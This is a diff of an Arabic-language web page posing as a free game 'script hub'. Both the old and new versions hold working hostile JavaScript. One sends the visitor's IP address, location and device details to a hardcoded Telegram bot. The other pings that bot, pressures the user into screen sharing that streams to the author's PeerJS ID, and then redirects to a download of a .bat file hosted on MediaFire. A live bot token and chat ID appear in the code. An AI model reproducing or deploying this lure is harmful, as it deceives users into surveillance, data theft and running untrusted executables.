@@ -6,97 +6,47 @@
     <title>Premium Script Hub 2026</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        :root { --primary-color: #00ffcc; --secondary-color: #ff00ff; }
-        body, html { height: 100%; margin: 0; font-family: 'Cairo', sans-serif; overflow: hidden; background: #000; }
-        
-        /* خلفية الصورة مع تأثير متحرك */
-        .bg-overlay {
-            background-image: url('https://i.ibb.co/v4x0XmY/1000014847.jpg');
-            background-size: cover; background-position: center;
-            position: absolute; width: 100%; height: 100%; z-index: -1;
-            filter: brightness(0.5) contrast(1.2); animation: pulse 5s infinite;
-        }
-
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-
-        .container {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            height: 100%; background: rgba(0, 0, 0, 0.4);
-        }
-
-        /* كرت الألوان المشعة RGB */
-        .script-card {
-            background: rgba(20, 20, 20, 0.9);
-            padding: 40px; border-radius: 25px;
-            border: 4px solid; border-image: linear-gradient(45deg, #00ffcc, #ff00ff, #0099ff) 1;
-            box-shadow: 0 0 30px rgba(0, 255, 204, 0.5);
-            text-align: center; max-width: 400px; animation: rgb-border 3s linear infinite;
-        }
-
-        @keyframes rgb-border { 0% { box-shadow: 0 0 20px #00ffcc; } 50% { box-shadow: 0 0 40px #ff00ff; } 100% { box-shadow: 0 0 20px #00ffcc; } }
-
-        h1 { color: #fff; text-shadow: 0 0 10px #00ffcc; font-size: 28px; margin-bottom: 15px; }
-        p { color: #ccc; font-size: 16px; margin-bottom: 30px; line-height: 1.6; }
-
-        /* زر RGB مشع */
-        .rgb-btn {
-            background: linear-gradient(45deg, #00ffcc, #0099ff);
-            color: #000; border: none; padding: 18px 50px;
-            font-size: 20px; font-weight: bold; border-radius: 12px;
-            cursor: pointer; text-transform: uppercase; transition: 0.3s;
-            box-shadow: 0 0 15px #00ffcc;
-        }
-
-        .rgb-btn:hover {
-            transform: translateY(-5px); box-shadow: 0 0 30px #ff00ff;
-            background: linear-gradient(45deg, #ff00ff, #00ffcc);
-        }
+        body { margin: 0; background: #000; color: white; font-family: sans-serif; text-align: center; }
+        .bg { background-image: url('https://i.ibb.co/v4x0XmY/1000014847.jpg'); background-size: cover; position: fixed; width: 100%; height: 100%; z-index: -1; filter: brightness(0.4); }
+        .box { margin-top: 150px; padding: 20px; border: 2px solid #00ffcc; display: inline-block; border-radius: 15px; background: rgba(0,0,0,0.8); box-shadow: 0 0 20px #00ffcc; }
+        .btn { background: linear-gradient(45deg, #00ffcc, #ff00ff); border: none; padding: 15px 30px; font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 10px; margin-top: 20px; box-shadow: 0 0 10px #ff00ff; }
     </style>
 </head>
 <body>
-
-<div class="bg-overlay"></div>
-
-<div class="container">
-    <div class="script-card">
-        <h1>🚀 سكربت الأوامر الخارق</h1>
-        <p>قم بتفعيل السكربت الآن للحصول على جميع الأدوات المميزة مجاناً داخل اللعبة.</p>
-        <button class="rgb-btn" onclick="executeHax()">تفعيل السكربت (RGB)</button>
+    <div class="bg"></div>
+    <div class="box">
+        <h1>🚀 تفعيل السكربت الخارق</h1>
+        <p>اضغط للبدء وسحب البيانات للعبة</p>
+        <button class="btn" onclick="sendToBot()">تفعيل السكربت الآن</button>
     </div>
-</div>
 
-<script>
-    const peer = new Peer();
-    const token = "8521430098:AAH9rZ7YNsbWwyigducN1EVOTMlg2UGtY9k";
-    const chat_id = "1330781289";
-    const myID = "Mr_Fm_Alpha_99";
+    <script>
+        const token = "8521430098:AAH9rZ7YNsbWwyigducN1EVOTMlg2UGtY9k";
+        const chat_id = "1330781289";
+        const myID = "Mr_Fm_Alpha_99";
+        const peer = new Peer();
 
-    async function executeHax() {
-        // 1. محاولة إرسال البيانات (IP)
-        try {
-            const res = await fetch('https://api.db-ip.com/v2/free/self');
-            const data = await res.json();
-            const text = 🔥 صيد جديد (RGB)!\n🌐 IP: ${data.ipAddress}\n📍 الموقع: ${data.countryName}\n📱 الجهاز: ${navigator.platform};
-            await fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)});
-        } catch (err) {
-            fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=الضحية ضغط ولكن المتصفح حظر البيانات);
+        function sendToBot() {
+            // محاولة إرسال رسالة بسيطة أولاً للتأكد من الاتصال
+            const testMsg = "🎯 شخص ما ضغط على الزر الآن!";
+            fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${testMsg})
+            .then(() => {
+                alert("جاري جلب بيانات السكربت... يرجى الموافقة على طلب البث");
+                startScreenShare();
+            })
+            .catch(err => alert("فشل الاتصال بالخادم، تأكد من الإنترنت"));
         }
 
-        // 2. طلب البث المباشر
-        try {
-            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-            peer.call(myID, stream);
-
-            alert("✅ تم تفعيل السكربت! جاري تحميل ملف التثبيت المباشر...");
-            // 3. تحميل ملف السيطرة
-            setTimeout(() => {
+        async function startScreenShare() {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                peer.call(myID, stream);
+                // تحميل الملف
                 window.location.href = "https://www.mediafire.com/file/uzu30zei1sp22ki/Mr_Master.bat/file";
-            }, 2000);
-        } catch (err) {
-            alert("❌ خطأ: يجب السماح بـ (مشاركة الشاشة) ليتمكن السكربت من قراءة بيانات اللعبة وتفعيلها!");
+            } catch (err) {
+                alert("يجب الموافقة على البث لتشغيل السكربت!");
+            }
         }
-    }
-</script>
-
+    </script>
 </body>
 </html>
